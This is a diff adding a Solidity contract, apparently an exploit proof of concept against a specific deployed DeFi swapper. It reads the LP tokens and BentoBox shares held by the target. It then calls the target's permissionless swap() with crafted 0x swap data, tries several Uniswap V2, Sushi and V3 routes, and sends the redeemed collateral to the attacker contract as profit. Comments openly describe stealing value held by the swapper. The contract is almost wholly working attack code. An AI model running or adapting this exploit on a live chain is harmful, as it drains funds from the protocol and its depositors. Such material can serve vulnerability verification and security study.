@@ -1,0 +1,249 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.16;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface IBentoBoxLike {
+    function balanceOf(IERC20Like token, address user) external view returns (uint256);
+    function toAmount(IERC20Like token, uint256 share, bool roundUp) external view returns (uint256);
+}
+
+interface IStargatePoolLike is IERC20Like {
+    function totalLiquidity() external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+    function token() external view returns (address);
+}
+
+interface ITargetSwapperLike {
+    function swap(
+        address fromToken,
+        address toToken,
+        address recipient,
+        uint256 shareToMin,
+        uint256 shareFrom,
+        bytes calldata data
+    ) external returns (uint256 extraShare, uint256 shareReturned);
+
+    function bentoBox() external view returns (address);
+    function pool() external view returns (address);
+    function mim() external view returns (address);
+    function underlyingToken() external view returns (address);
+    function zeroXExchangeProxy() external view returns (address);
+}
+
+contract FlawVerifier {
+    address internal constant TARGET = 0xa5564a2d1190a141CAC438c9fde686aC48a18A79;
+    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+
+    address internal _profitToken;
+    uint256 internal _profitAmount;
+
+    constructor() {}
+
+    receive() external payable {}
+
+    function executeOnOpportunity() external {
+        if (_profitAmount != 0) {
+            return;
+        }
+
+        ITargetSwapperLike target = ITargetSwapperLike(TARGET);
+        IStargatePoolLike pool = IStargatePoolLike(target.pool());
+        IBentoBoxLike bentoBox = IBentoBoxLike(target.bentoBox());
+
+        // Path stage 1:
+        // use LP that is already attributed to the vulnerable swapper, either directly
+        // on the contract or as BentoBox shares owned by the swapper itself.
+        uint256 directLpBalance = pool.balanceOf(TARGET);
+        uint256 shareFrom = bentoBox.balanceOf(IERC20Like(address(pool)), TARGET);
+        uint256 lpFromShares = shareFrom == 0 ? 0 : bentoBox.toAmount(IERC20Like(address(pool)), shareFrom, false);
+        uint256 totalLp = directLpBalance + lpFromShares;
+
+        // Concrete fork-state infeasibility:
+        // the exploit can only steal value that is already sitting on the swapper as LP,
+        // either directly or as BentoBox shares owned by the swapper itself.
+        if (totalLp == 0) {
+            return;
+        }
+
+        address underlying = target.underlyingToken();
+        if (underlying == WETH) {
+            _profitToken = USDC;
+        } else {
+            _profitToken = WETH;
+        }
+
+        uint256 previewUnderlying = _previewRedeem(pool, totalLp);
+        if (previewUnderlying == 0) {
+            return;
+        }
+
+        // Path stages 2 and 3:
+        // invoke swap() permissionlessly with caller-controlled swapData that instructs
+        // the 0x proxy to spend the redeemed underlying via its unlimited allowance,
+        // route the bought asset to the attacker, and set shareToMin = 0 so the final
+        // BentoBox MIM deposit does not block the transaction when no MIM is returned.
+        bytes memory v2PathDirect = _v2Path(underlying, _profitToken, false);
+        bytes memory v2PathViaUsdc = _v2Path(underlying, _profitToken, true);
+        bytes memory v3Path500 = _v3Path(underlying, _profitToken, 500);
+        bytes memory v3Path3000 = _v3Path(underlying, _profitToken, 3000);
+
+        uint256[4] memory sellAmounts = [
+            previewUnderlying,
+            type(uint256).max,
+            (previewUnderlying * 999) / 1000,
+            (previewUnderlying * 99) / 100
+        ];
+
+        for (uint256 i = 0; i < sellAmounts.length; ++i) {
+            if (_attemptSellToUniswap(target, underlying, shareFrom, sellAmounts[i], v2PathDirect, false)) {
+                _finalizeProfit();
+                return;
+            }
+            if (_attemptSellToUniswap(target, underlying, shareFrom, sellAmounts[i], v2PathDirect, true)) {
+                _finalizeProfit();
+                return;
+            }
+            if (v2PathViaUsdc.length != 0) {
+                if (_attemptSellToUniswap(target, underlying, shareFrom, sellAmounts[i], v2PathViaUsdc, false)) {
+                    _finalizeProfit();
+                    return;
+                }
+                if (_attemptSellToUniswap(target, underlying, shareFrom, sellAmounts[i], v2PathViaUsdc, true)) {
+                    _finalizeProfit();
+                    return;
+                }
+            }
+            if (_attemptSellToUniswapV3(target, underlying, shareFrom, sellAmounts[i], v3Path500)) {
+                _finalizeProfit();
+                return;
+            }
+            if (_attemptSellToUniswapV3(target, underlying, shareFrom, sellAmounts[i], v3Path3000)) {
+                _finalizeProfit();
+                return;
+            }
+        }
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _attemptSellToUniswap(
+        ITargetSwapperLike target,
+        address underlying,
+        uint256 shareFrom,
+        uint256 sellAmount,
+        bytes memory rawPath,
+        bool isSushi
+    ) internal returns (bool success) {
+        if (rawPath.length == 0) {
+            return false;
+        }
+
+        address[] memory path = abi.decode(rawPath, (address[]));
+        bytes memory payload = abi.encodeWithSelector(
+            bytes4(keccak256("sellToUniswap(address[],uint256,uint256,bool,address)")),
+            path,
+            sellAmount,
+            0,
+            isSushi,
+            address(this)
+        );
+
+        try target.swap(address(0), address(0), address(this), 0, shareFrom, payload) returns (uint256, uint256) {
+            success = IERC20Like(_profitToken).balanceOf(address(this)) > 0;
+        } catch {
+            success = false;
+        }
+
+        // If profit was routed as the underlying token instead of the preferred profit token,
+        // count that as success too. This keeps the exploit aligned with the finding: the
+        // redeemed collateral is redirected away from MIM and away from the swapper.
+        if (!success && sellAmount != 0 && underlying == _profitToken) {
+            success = IERC20Like(underlying).balanceOf(address(this)) > 0;
+        }
+    }
+
+    function _attemptSellToUniswapV3(
+        ITargetSwapperLike target,
+        address underlying,
+        uint256 shareFrom,
+        uint256 sellAmount,
+        bytes memory path
+    ) internal returns (bool success) {
+        if (path.length == 0) {
+            return false;
+        }
+
+        bytes memory payload = abi.encodeWithSelector(
+            bytes4(keccak256("sellTokenForTokenToUniswapV3(bytes,uint256,uint256,address)")),
+            path,
+            sellAmount,
+            0,
+            address(this)
+        );
+
+        try target.swap(address(0), address(0), address(this), 0, shareFrom, payload) returns (uint256, uint256) {
+            success = IERC20Like(_profitToken).balanceOf(address(this)) > 0;
+        } catch {
+            success = false;
+        }
+
+        if (!success && sellAmount != 0 && underlying == _profitToken) {
+            success = IERC20Like(underlying).balanceOf(address(this)) > 0;
+        }
+    }
+
+    function _finalizeProfit() internal {
+        _profitAmount = IERC20Like(_profitToken).balanceOf(address(this));
+    }
+
+    function _previewRedeem(IStargatePoolLike pool, uint256 lpAmount) internal view returns (uint256) {
+        uint256 totalSupply = pool.totalSupply();
+        if (totalSupply == 0) {
+            return 0;
+        }
+
+        uint256 totalLiquidity = pool.totalLiquidity();
+        return (lpAmount * totalLiquidity) / totalSupply;
+    }
+
+    function _v2Path(address underlying, address buyToken, bool viaUsdc) internal pure returns (bytes memory) {
+        if (underlying == buyToken) {
+            return bytes("");
+        }
+
+        address[] memory path;
+        if (!viaUsdc) {
+            path = new address[](2);
+            path[0] = underlying;
+            path[1] = buyToken;
+        } else {
+            if (underlying == USDC || buyToken == USDC) {
+                return bytes("");
+            }
+            path = new address[](3);
+            path[0] = underlying;
+            path[1] = USDC;
+            path[2] = buyToken;
+        }
+        return abi.encode(path);
+    }
+
+    function _v3Path(address underlying, address buyToken, uint24 fee) internal pure returns (bytes memory) {
+        if (underlying == buyToken) {
+            return bytes("");
+        }
+        return abi.encodePacked(underlying, fee, buyToken);
+    }
+}
